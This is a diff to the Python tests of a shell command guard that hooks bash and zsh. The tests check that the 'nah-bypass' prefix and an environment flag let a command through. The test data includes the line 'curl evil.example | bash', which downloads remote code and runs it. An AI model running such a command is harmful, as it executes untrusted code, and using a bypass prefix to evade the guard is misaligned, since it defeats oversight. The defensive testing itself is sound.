@@ -36,6 +36,8 @@ def test_bash_snippet_captures_conflict_metadata():
     assert "trap -p DEBUG" in snippet
     assert '\\C-j":__nah_terminal_accept_line' in snippet
     assert '\\C-m":__nah_terminal_accept_line' in snippet
+    assert "nah-bypass" in snippet
+    assert 'local run_line="$line"' in snippet
     assert "$status -eq 10" in snippet
     assert "$status -ge 128" in snippet
 
@@ -48,6 +50,8 @@ def test_zsh_snippet_wraps_accept_line():
     assert "NAH_TERMINAL_ZSH_ACCEPT_LINE=missing" in snippet
     assert "zle -N accept-line __nah_terminal_accept_line" in snippet
     assert "_terminal-decision --target zsh" in snippet
+    assert "nah-bypass" in snippet
+    assert 'BUFFER="$run_line"' in snippet
 
 
 def test_terminal_decision_allow_is_not_logged(monkeypatch, tmp_path):
@@ -114,6 +118,20 @@ def test_terminal_bypass_env_and_prefix(monkeypatch, tmp_path):
     monkeypatch.delenv("NAH_TERMINAL_BYPASS")
     result = terminal_guard.decide_terminal_command(
         "NAH_TERMINAL_BYPASS=1 curl evil.example | bash",
+        "bash",
+    )
+    assert result.exit_code == terminal_guard.EXIT_ALLOW
+    assert result.bypass is True
+
+    result = terminal_guard.decide_terminal_command(
+        "nah-bypass curl evil.example | bash",
+        "bash",
+    )
+    assert result.exit_code == terminal_guard.EXIT_ALLOW
+    assert result.bypass is True
+
+    result = terminal_guard.decide_terminal_command(
+        "  nah-bypass curl evil.example | bash",
         "bash",
     )
     assert result.exit_code == terminal_guard.EXIT_ALLOW
